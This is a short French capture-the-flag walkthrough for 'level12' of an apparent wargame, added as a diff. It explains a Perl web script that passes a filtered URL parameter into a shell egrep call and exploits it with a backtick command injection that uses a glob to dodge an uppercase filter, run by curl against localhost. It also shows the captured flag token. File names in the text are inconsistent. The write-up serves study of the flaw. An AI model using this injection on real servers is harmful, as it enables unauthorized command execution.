@@ -1,0 +1,51 @@
+-----------------------------------------------------------
+                          LEVEL12
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition, on
+   a :
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level12.pl
+
+2. On cat le contenu du script level.pl. On constate que 
+   ce script écoute sur le port http 4646 et attend 2 
+   arguments dans l'URL (x et y). Tout paramètre x spécicié
+   passe aà travers 2 regex :
+   - Le 1er transforme tout les charactères alphabétique en
+     majuscule ;
+   - Le 2nd supprime tout les espaces.
+   Une fois filtré, le paramètre x est injecté dans un 
+   egrep : c'est notamment ici que l'on peut exploiter une
+   fail d'injection.
+   --------------------------------------------------------
+   CMD : cat level11.lua
+   OUTPUT : [...]
+            # localhost:4646
+            [...]
+            $xx =~ tr/a-z/A-Z/;
+            $xx =~ s/\s.*//;
+            @output = `egrep "^$xx" /tmp/xd 2>&1`;
+            [...]
+            n(t(param("x"), param("y")));
+            [...]
+
+3. De fait, on créé un script bash /tmp/EXPLOIT avec le 
+   contenu suivant :
+   --------------------------------------------------------
+   SCRIPT : #!/bin/bash
+            getflag | wall
+
+4. Ensuite, on envoie une requête HTTP sur le port 4646
+   avec comme paramètre 'x=/*/EXPLOIT' (les majuscule ne 
+   sont pas importante du fait du regex 1 spécifié 
+   ci-dessus) 
+   --------------------------------------------------------
+   CMD : curl 'localhost:4646?x=`/*/EXPLOIT`&y='
+   OUTPUT : Broadcast Message from flag12@Snow
+            (somewhere) at 14:44 ...
+
+            Check flag.
+            Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+            ..
